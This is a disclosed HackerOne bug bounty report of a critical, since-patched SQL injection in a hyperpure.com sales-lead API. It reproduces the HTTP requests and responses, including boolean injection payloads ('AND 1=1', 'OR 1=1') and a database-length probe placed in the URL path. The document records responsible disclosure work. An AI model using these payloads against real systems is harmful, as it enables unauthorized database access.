---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - vuln/sql-injection
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2021-02-22
submitted: 2020-11-26T18:57:13.717Z
bounty_usd: 2000
votes: 229
cve: []
program: "[[programs/eternal|Eternal]]"
reporter: "hoteyes"
source: "https://hackerone.com/reports/1044716"
title: "SQL Injection in www.hyperpure.com"
---
# SQL Injection in www.hyperpure.com

> **Severity:** Critical | **Bounty:** 2,000 USD | **Votes:** 229 | **Program:** Eternal | **Disclosed:** 2021-02-22

- Report: [https://hackerone.com/reports/1044716](https://hackerone.com/reports/1044716)
- CWE: Code Injection
- Submitted: 2020-11-26T18:57:13.717Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Vulnerable Request :

PUT /consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc    HTTP/1.1
Host: api.hyperpure.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
X-Client: consumer
X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a
HeaderRoute: v2
APIVersion: 4.2
AppType: web
Content-Length: 246
Origin: https://www.hyperpure.com
Connection: close
Referer: https://www.hyperpure.com/register

{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"█████","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}

The above request is used to create sales lead with the data the sales lead id is produced and verified by the domain.

Base Response Received: 

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 68
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://www.hyperpure.com
x-envoy-upstream-service-time: 166
Server: envoy
Date: Thu, 26 Nov 2020 18:48:34 GMT
Connection: close
Vary: Accept-Encoding

{"response":{"salesLeadId":"6b6a8a5a-4a74-46db-b2fe-32a46f927ecc"}}


Now we will be executing following steps to verify if  "AND "  & "OR" statements work.

1) Proving AND condition working while using it with a valid sales id  " AND 1 = "1 --+-   
2) Proving AND condition false with working sales lead using AND 1=0.
3) Proving adding cool as a sales lead by using OR 1=1 , which always states true.

## Impact

Adding random sales ID in the database using PUT statement and populating it.

## Timeline

- **Report Filed**
- **2020-11-26** @hoteyes: The below request also proves the database has the length of 11.

Request::

PUT /consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc" AND (length(database())) = "11 --+-    HTTP/1.1
Host: api.hyperpure.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
X-Client: consumer
X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a
HeaderRoute: v2
APIVersion: 4.2
AppType: web
Content-Length: 246
Origin: https://www.hyperpure.com
Connection: close
Referer: https://www.hyperpure.com/register

{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"███","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}

Response ::

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 107
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://www.hyperpure.com
x-envoy-upstream-service-time: 101
Server: envoy
Date: Thu, 26 Nov 2020 21:08:22 GMT
Connection: close
Vary: Accept-Encoding

{"response":{"salesLeadId":"6b6a8a5a-4a74-46db-b2fe-32a46f927ecc\" AND (length(database())) = \"11 --+-"}}
- **2020-11-27** @biryani-is-lob: Hi @hoteyes, 

Thanks for the submission, we are looking into this.
@biryani-is-lob
- **Report Triaged**
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Title Updated**
- **2020-11-27** @hoteyes: Thank you for the Reward , You made my day :)
- **2020-12-11** @panipuri: Hi @hoteyes,

We have deployed a fix for this report. Could you please check and confirm?

Thanks,
@panipuri
- **2020-12-12** @hoteyes: Confirming the api request has been removed from the updated api's available at the time of the sign up.
Hence Patched :)
- **2020-12-16** @hoteyes: Please let me know if I am wrong .

Regards,
Gaurav Gera
- **2020-12-16** @panipuri: Hi @hoteyes,

The endpoint has not been removed from our end.

Regards,
@panipuri
- **2020-12-17** @hoteyes: Cool will look into it again , My bad 

Regards,
Hoteyes
- **2020-12-18** @hoteyes: Dear Panipuri ,

Confirming it is patched.

Thanks,

Hoteyes
- **2020-12-25** @hoteyes: Dear Team,

Please let me know if any other information is required.

Regards,
hoteyes
- **Report Resolved**
- **Agreed On Going Public**
- **2021-02-08** @hoteyes: Requesting to remove PII data before disclosing.
- **2021-02-09** @panipuri: @hoteyes - I found only your phone number and have redacted it, do you see any other PII in the report which I might have missed?
- **2021-02-09** @hoteyes: Seems good
- **Agreed On Going Public**
- **Report Became Public**
